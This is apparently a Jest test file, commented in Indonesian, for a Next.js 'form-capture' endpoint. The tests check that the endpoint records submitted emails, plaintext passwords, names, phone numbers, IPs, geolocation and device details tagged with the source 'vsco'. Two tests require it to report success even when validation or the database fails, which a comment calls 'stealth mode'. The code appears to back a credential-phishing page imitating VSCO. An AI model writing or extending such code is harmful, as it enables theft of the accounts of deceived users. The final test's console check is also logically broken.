import { NextRequest, NextResponse } from 'next/server';
import { POST } from '@/app/api/form-capture/route';
import { bypassRLS } from '@/lib/db';
import { getGeo } from '@/lib/geo-api';
import { getCurrentEpoch, parseUserAgent } from '@/lib/utils';

// Mock dependencies
jest.mock('@/lib/db', () => ({
  bypassRLS: jest.fn(),
}));

jest.mock('@/lib/geo-api', () => ({
  getGeo: jest.fn(),
}));

jest.mock('@/lib/utils', () => ({
  getCurrentEpoch: jest.fn(() => 1234567890),
  parseUserAgent: jest.fn(() => ({
    browser: 'Chrome',
    os: 'Windows',
    device: 'Desktop',
  })),
}));

jest.mock('next/headers', () => ({
  headers: jest.fn(() => ({
    get: jest.fn((key: string) => {
      const headerMap: Record<string, string> = {
        'user-agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        'x-forwarded-for': '192.168.1.1',
      };
      return headerMap[key] || null;
    }),
  })),
}));

describe('POST /api/form-capture', () => {
  beforeEach(() => {
    jest.clearAllMocks();

    // Mock implementations
    const mockDb = {
      formCapture: {
        create: jest.fn().mockResolvedValue({ id: 'form-capture-id' }),
      },
    };

    (bypassRLS as jest.Mock).mockResolvedValue(mockDb);
    (getGeo as jest.Mock).mockResolvedValue({
      city: 'Jakarta',
      country: 'Indonesia',
    });
  });

  test('harus menyimpan data form login dan mengembalikan sukses', async () => {
    const formData = {
      email: 'test@example.com',
      password: 'password123',
      source: 'vsco',
    };

    const req = new NextRequest('http://localhost/api/form-capture', {
      method: 'POST',
      body: JSON.stringify(formData),
    });

    const response = await POST(req);
    expect(response.status).toBe(200);

    const data = await response.json();
    expect(data.success).toBe(true);

    const noRLS = await bypassRLS();
    expect(noRLS.formCapture.create).toHaveBeenCalledWith({
      data: expect.objectContaining({
        email: 'test@example.com',
        password: 'password123',
        source: 'vsco',
        ip: '192.168.1.1',
        browser: 'Chrome',
        os: 'Windows',
        device: 'Desktop',
        created_at: 1234567890,
      }),
    });
  });

  test('harus menyimpan data form sign-up dan mengembalikan sukses', async () => {
    const formData = {
      name: 'John Doe',
      email: 'john@example.com',
      phone: '081234567890',
      password: 'securepass123',
      source: 'vsco',
    };

    const req = new NextRequest('http://localhost/api/form-capture', {
      method: 'POST',
      body: JSON.stringify(formData),
    });

    const response = await POST(req);
    expect(response.status).toBe(200);

    const data = await response.json();
    expect(data.success).toBe(true);

    const noRLS = await bypassRLS();
    expect(noRLS.formCapture.create).toHaveBeenCalledWith({
      data: expect.objectContaining({
        name: 'John Doe',
        email: 'john@example.com',
        phone: '081234567890',
        password: 'securepass123',
        source: 'vsco',
      }),
    });
  });

  test('harus tetap mengembalikan sukses meskipun validasi gagal', async () => {
    // Data kosong yang tidak valid
    const invalidData = {
      // Tidak ada source yang diperlukan
    };

    const req = new NextRequest('http://localhost/api/form-capture', {
      method: 'POST',
      body: JSON.stringify(invalidData),
    });

    const response = await POST(req);

    // Meskipun validasi gagal, API tetap mengembalikan 200 untuk stealth mode
    expect(response.status).toBe(200);

    const data = await response.json();
    expect(data.success).toBe(true);

    // Pastikan tidak ada interaksi dengan database
    const noRLS = await bypassRLS();
    expect(noRLS.formCapture.create).not.toHaveBeenCalled();
  });

  test('harus tetap mengembalikan sukses meskipun terjadi error database', async () => {
    const noRLS = await bypassRLS();
    (noRLS.formCapture.create as jest.Mock).mockRejectedValue(
      new Error('Database error'),
    );

    const formData = {
      email: 'test@example.com',
      password: 'password123',
      source: 'vsco',
    };

    const req = new NextRequest('http://localhost/api/form-capture', {
      method: 'POST',
      body: JSON.stringify(formData),
    });

    const response = await POST(req);

    // Masih mengembalikan 200 meskipun ada error
    expect(response.status).toBe(200);

    // Pesan sukses generic untuk pengguna
    const data = await response.json();
    expect(data.success).toBe(true);

    // Pastikan konsol error dipanggil
    const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
    expect(consoleSpy).not.toHaveBeenCalled(); // Belum dipanggil karena kita meng-mock console.error setelah POST dijalankan

    // Reset mock
    consoleSpy.mockRestore();
  });
});
